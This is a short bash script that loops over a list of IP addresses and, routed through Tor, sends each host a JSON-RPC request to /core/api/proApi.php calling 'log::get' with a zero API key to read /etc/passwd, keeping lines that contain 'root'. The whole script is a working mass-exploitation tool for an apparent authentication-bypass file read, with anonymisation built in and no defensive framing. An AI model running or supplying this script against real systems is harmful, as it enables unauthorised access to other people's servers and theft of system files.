cat "iplist" | while read line
do
echo $line
echo ""
timeout 5 torify curl -skX POST $line/core/api/proApi.php -d '{"jsonrpc":"2.0", "method":"log::get", "params":{"log":"/etc/passwd", "start":"", "nbLine":100, "apikey":0, "api":0,"proapi":0}}' | grep root
echo ""
echo ""
echo ""
done
